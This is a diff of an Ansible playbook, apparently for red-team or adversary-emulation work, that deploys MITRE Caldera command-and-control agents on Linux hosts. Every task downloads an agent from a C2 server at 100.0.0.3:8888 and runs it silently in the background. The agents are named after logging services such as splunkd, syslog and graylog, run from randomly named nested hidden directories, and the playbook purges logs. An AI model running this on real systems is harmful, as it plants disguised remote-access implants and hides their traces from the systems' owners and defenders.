@@ -13,39 +13,7 @@
     random_folder3: "{{ lookup('password', '/dev/null', 'length=4', 'chars=ascii_letters') }}"
     # Final hidden directory (nested three levels deep)
     deploy_dir: "{{ deploy_base_dir }}/{{ random_folder1 }}/{{ random_folder2 }}/{{ random_folder3 }}"
-
-    # Caldera server URL; change as appropriate
-    server: "http://100.0.0.3:8888"
-
-    # Agent names are divided into groups.
-    # HTTP Sandcat agents (default)
-    http_agents:
-      - splunkd
-      - splunk
-      - syslog
-      - graylog
-      - log
-      - notlog
-      - notlog-http
-    # HTML RagDoll agents
-    html_agents:
-      - notlog-html
-      - syslog-html
-      - log-html
-      - ragdoll
-    # Manx TCP agents
-    tcp_agents:
-      - notlog-tcp
-      - syslog-tcp
-      - log-tcp
-      - splunk-tcp
-
-    agent_names: "{{ http_agents + html_agents + tcp_agents }}"
-
     purge_logs: true
-
-    tcp_socket: "100.0.0.3:7010"
-    tcp_contact: "tcp"
 
   tasks:
     - name: Install python3 and python3-pip
@@ -71,113 +39,138 @@
     ###################################################################
     # Deploy multiple Caldera agents based on agent name (in background)
     ###################################################################
-    ###################################################################
-    # 4) Deploy Caldera agents individually (no loop)
-    ###################################################################
+    
+
+    # === HTTP Agents (Sandcat) ===
     - name: Deploy splunkd (HTTP)
       shell: |
+        server="http://100.0.0.3:8888"
         cd {{ deploy_dir }}
-        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" {{ server }}/file/download > splunkd
+        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > splunkd
         chmod +x splunkd
-        nohup ./splunkd -server {{ server }} -group red >/dev/null 2>&1 &
+        nohup ./splunkd -server "$server" -group red >/dev/null 2>&1 &
 
     - name: Deploy splunk (HTTP)
       shell: |
+        server="http://100.0.0.3:8888"
         cd {{ deploy_dir }}
-        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" {{ server }}/file/download > splunk
+        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > splunk
         chmod +x splunk
-        nohup ./splunk -server {{ server }} -group red >/dev/null 2>&1 &
+        nohup ./splunk -server "$server" -group red >/dev/null 2>&1 &
 
     - name: Deploy syslog (HTTP)
       shell: |
+        server="http://100.0.0.3:8888"
         cd {{ deploy_dir }}
-        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" {{ server }}/file/download > syslog
+        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > syslog
         chmod +x syslog
-        nohup ./syslog -server {{ server }} -group red >/dev/null 2>&1 &
+        nohup ./syslog -server "$server" -group red >/dev/null 2>&1 &
 
     - name: Deploy graylog (HTTP)
       shell: |
+        server="http://100.0.0.3:8888"
         cd {{ deploy_dir }}
-        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" {{ server }}/file/download > graylog
+        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > graylog
         chmod +x graylog
-        nohup ./graylog -server {{ server }} -group red >/dev/null 2>&1 &
+        nohup ./graylog -server "$server" -group red >/dev/null 2>&1 &
 
     - name: Deploy log (HTTP)
       shell: |
+        server="http://100.0.0.3:8888"
         cd {{ deploy_dir }}
-        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" {{ server }}/file/download > log
+        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > log
         chmod +x log
-        nohup ./log -server {{ server }} -group red >/dev/null 2>&1 &
+        nohup ./log -server "$server" -group red >/dev/null 2>&1 &
 
     - name: Deploy notlog (HTTP)
       shell: |
+        server="http://100.0.0.3:8888"
         cd {{ deploy_dir }}
-        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" {{ server }}/file/download > notlog
+        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > notlog
         chmod +x notlog
-        nohup ./notlog -server {{ server }} -group red >/dev/null 2>&1 &
+        nohup ./notlog -server "$server" -group red >/dev/null 2>&1 &
 
     - name: Deploy notlog-http (HTTP)
       shell: |
+        server="http://100.0.0.3:8888"
         cd {{ deploy_dir }}
-        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" {{ server }}/file/download > notlog-http
+        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > notlog-http
         chmod +x notlog-http
-        nohup ./notlog-http -server {{ server }} -group red >/dev/null 2>&1 &
+        nohup ./notlog-http -server "$server" -group red >/dev/null 2>&1 &
 
-    - name: Deploy notlog-html (HTML RagDoll)
+    # === HTML Agents (RagDoll) ===
+    - name: Deploy notlog-html (HTML)
       shell: |
+        server="http://100.0.0.3:8888"
         cd {{ deploy_dir }}
-        curl -s -X POST -H "file:ragdoll.go" -H "platform:linux" {{ server }}/file/download > notlog-html
-        chmod +x notlog-html
-        nohup ./notlog-html -server {{ server }} -group red -html >/dev/null 2>&1 &
+        curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" "$server/file/download" > notlog-html.py
+        pip install -q requests beautifulsoup4
+        nohup python3 notlog-html.py -W "$server/weather" >/dev/null 2>&1 &
 
-    - name: Deploy syslog-html (HTML RagDoll)
+    - name: Deploy syslog-html (HTML)
       shell: |
+        server="http://100.0.0.3:8888"
         cd {{ deploy_dir }}
-        curl -s -X POST -H "file:ragdoll.go" -H "platform:linux" {{ server }}/file/download > syslog-html
-        chmod +x syslog-html
-        nohup ./syslog-html -server {{ server }} -group red -html >/dev/null 2>&1 &
+        curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" "$server/file/download" > syslog-html.py
+        pip install -q requests beautifulsoup4
+        nohup python3 syslog-html.py -W "$server/weather" >/dev/null 2>&1 &
 
-    - name: Deploy log-html (HTML RagDoll)
+    - name: Deploy log-html (HTML)
       shell: |
+        server="http://100.0.0.3:8888"
         cd {{ deploy_dir }}
-        curl -s -X POST -H "file:ragdoll.go" -H "platform:linux" {{ server }}/file/download > log-html
-        chmod +x log-html
-        nohup ./log-html -server {{ server }} -group red -html >/dev/null 2>&1 &
+        curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" "$server/file/download" > log-html.py
+        pip install -q requests beautifulsoup4
+        nohup python3 log-html.py -W "$server/weather" >/dev/null 2>&1 &
 
-    - name: Deploy ragdoll (HTML RagDoll)
+    - name: Deploy ragdoll (HTML)
       shell: |
+        server="http://100.0.0.3:8888"
         cd {{ deploy_dir }}
-        curl -s -X POST -H "file:ragdoll.go" -H "platform:linux" {{ server }}/file/download > ragdoll
-        chmod +x ragdoll
-        nohup ./ragdoll -server {{ server }} -group red -html >/dev/null 2>&1 &
+        curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" "$server/file/download" > ragdoll.py
+        pip install -q requests beautifulsoup4
+        nohup python3 ragdoll.py -W "$server/weather" >/dev/null 2>&1 &
 
+    # === Manx TCP Agents ===
     - name: Deploy notlog-tcp (Manx TCP)
       shell: |
+        server="http://100.0.0.3:8888"
+        socket="100.0.0.3:7010"
+        contact="tcp"
         cd {{ deploy_dir }}
-        curl -s -X POST -H "file:manx.go" -H "platform:linux" {{ server }}/file/download > notlog-tcp
+        curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > notlog-tcp
         chmod +x notlog-tcp
-        nohup ./notlog-tcp -server {{ server }} -socket {{ tcp_socket }} -contact {{ tcp_contact }} >/dev/null 2>&1 &
+        nohup ./notlog-tcp -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &
 
     - name: Deploy syslog-tcp (Manx TCP)
       shell: |
+        server="http://100.0.0.3:8888"
+        socket="100.0.0.3:7010"
+        contact="tcp"
         cd {{ deploy_dir }}
-        curl -s -X POST -H "file:manx.go" -H "platform:linux" {{ server }}/file/download > syslog-tcp
+        curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > syslog-tcp
         chmod +x syslog-tcp
-        nohup ./syslog-tcp -server {{ server }} -socket {{ tcp_socket }} -contact {{ tcp_contact }} >/dev/null 2>&1 &
+        nohup ./syslog-tcp -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &
 
     - name: Deploy log-tcp (Manx TCP)
       shell: |
+        server="http://100.0.0.3:8888"
+        socket="100.0.0.3:7010"
+        contact="tcp"
         cd {{ deploy_dir }}
-        curl -s -X POST -H "file:manx.go" -H "platform:linux" {{ server }}/file/download > log-tcp
+        curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > log-tcp
         chmod +x log-tcp
-        nohup ./log-tcp -server {{ server }} -socket {{ tcp_socket }} -contact {{ tcp_contact }} >/dev/null 2>&1 &
+        nohup ./log-tcp -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &
 
     - name: Deploy splunk-tcp (Manx TCP)
       shell: |
+        server="http://100.0.0.3:8888"
+        socket="100.0.0.3:7010"
+        contact="tcp"
         cd {{ deploy_dir }}
-        curl -s -X POST -H "file:manx.go" -H "platform:linux" {{ server }}/file/download > splunk-tcp
+        curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > splunk-tcp
         chmod +x splunk-tcp
-        nohup ./splunk-tcp -server {{ server }} -socket {{ tcp_socket }} -contact {{ tcp_contact }} >/dev/null 2>&1 &
+        nohup ./splunk-tcp -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &
 
 
     ###################################################################
